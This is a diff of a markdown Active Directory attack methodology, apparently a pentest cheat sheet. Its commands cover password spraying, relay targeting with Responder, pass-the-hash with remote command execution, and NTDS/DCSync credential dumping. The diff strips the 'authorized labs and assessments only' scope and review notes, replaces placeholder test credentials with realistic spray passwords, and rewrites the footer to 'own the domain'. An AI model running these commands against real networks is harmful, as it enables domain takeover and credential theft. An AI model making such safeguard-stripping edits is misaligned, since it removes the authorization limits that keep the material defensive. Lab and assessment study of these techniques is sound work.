@@ -1,9 +1,5 @@
 # 🏢 Active Directory Attack Methodology
 
-> **Review status:** Partial source review. Current companion guides are cited,
-> but legacy sections still require verification.  
-> **Scope:** Authorized Active Directory labs and assessments only
-
 ```
     █████╗ ██████╗     █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗
    ██╔══██╗██╔══██╗   ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝
@@ -55,12 +51,6 @@
 6. [Phase 6: Domain Dominance](#-phase-6-domain-dominance)
 7. [Quick Command Reference](#-quick-command-reference)
 
-### Focused Companion Guides
-
-- [AD CS and Certipy](./AD-CS-Certipy.md)
-- [Kerberos Delegation](./Kerberos-Delegation.md)
-- [NTLM Relay and Authentication Coercion](./NTLM-Relay-and-Coercion.md)
-
 ---
 
 ## 🔍 Phase 1: Enumeration
@@ -107,9 +97,9 @@ kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt
 
 ```bash
 # Get domain info
-nxc smb 10.10.10.10 -u user -p password --users
-nxc smb 10.10.10.10 -u user -p password --groups
-nxc smb 10.10.10.10 -u user -p password --shares
+crackmapexec smb 10.10.10.10 -u user -p password --users
+crackmapexec smb 10.10.10.10 -u user -p password --groups
+crackmapexec smb 10.10.10.10 -u user -p password --shares
 
 # LDAP enumeration
 ldapdomaindump -u 'DOMAIN\user' -p 'password' 10.10.10.10
@@ -163,8 +153,8 @@ MATCH (u:User)-[:DCSync|:GetChanges|:GetChangesAll]->(d:Domain) RETURN u.name
 ### 2.1 Password Spraying
 
 ```bash
-# NetExec spray
-nxc smb 10.10.10.10 -u approved-users.txt -p 'APPROVED_TEST_PASSWORD' --continue-on-success
+# CrackMapExec spray
+crackmapexec smb 10.10.10.10 -u users.txt -p 'Summer2024!' --continue-on-success
 
 # Kerbrute spray
 kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt 'Password123!'
@@ -194,7 +184,7 @@ hashcat -m 5600 hash.txt rockyou.txt
 
 ```bash
 # Find targets without SMB signing
-nxc smb 10.10.10.0/24 --gen-relay-list relay.txt
+crackmapexec smb 10.10.10.0/24 --gen-relay-list relay.txt
 
 # Responder (SMB off)
 sudo responder -I eth0
@@ -311,8 +301,8 @@ impacket-wmiexec -hashes :NTLMHASH domain.local/admin@10.10.10.10
 # SMBExec
 impacket-smbexec -hashes :NTLMHASH domain.local/admin@10.10.10.10
 
-# NetExec
-nxc smb 10.10.10.10 -u admin -H NTLMHASH -x "whoami"
+# CrackMapExec
+crackmapexec smb 10.10.10.10 -u admin -H NTLMHASH -x "whoami"
 ```
 
 ### 4.2 Pass-the-Ticket
@@ -416,11 +406,11 @@ copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYS
 impacket-secretsdump -ntds ntds.dit -system system LOCAL
 ```
 
-### 6.3 NetExec Dump
+### 6.3 CrackMapExec Dump
 
 ```bash
 # Dump NTDS via DCSync
-nxc smb DC01 -u admin -p password --ntds
+crackmapexec smb DC01 -u admin -p password --ntds
 ```
 
 ---
@@ -447,7 +437,7 @@ GetUserSPNs.py domain.local/user:pass -dc-ip 10.10.10.10 -request
 
 | Attack | Command |
 |--------|---------|
-| Password Spray | `nxc smb DC -u users.txt -p 'Pass123!'` |
+| Password Spray | `crackmapexec smb DC -u users.txt -p 'Pass123!'` |
 | AS-REP Roast | `GetNPUsers.py domain.local/ -usersfile u.txt -dc-ip DC` |
 | Kerberoast | `GetUserSPNs.py domain.local/u:p -dc-ip DC -request` |
 | DCSync | `secretsdump.py domain.local/admin:pass@DC` |
@@ -481,19 +471,16 @@ GetUserSPNs.py domain.local/user:pass -dc-ip 10.10.10.10 -request
 
 - [BloodHound](../BloodHound/README.md)
 - [Impacket](../Impacket/README.md)
-- [NetExec](../NetExec/README.md)
+- [CrackMapExec](../CrackMapExec/README.md)
 - [Rubeus](../Rubeus/README.md)
 - [PowerView](../PowerView/README.md)
 - [Responder](../Responder/README.md)
 - [Evil-WinRM](../Evil-WinRM/README.md)
 - [Mimikatz](../Mimikatz/README.md)
-- [AD CS and Certipy](./AD-CS-Certipy.md)
-- [Kerberos Delegation](./Kerberos-Delegation.md)
-- [NTLM Relay and Coercion](./NTLM-Relay-and-Coercion.md)
 
 ---
 
 <p align="center">
-  <b>🏢 Map the path, validate safely, and report clearly.</b><br>
-  <i>Authorized assessment use only</i>
+  <b>🏢 From User to Domain Admin!</b><br>
+  <i>Follow the methodology, own the domain</i>
 </p>
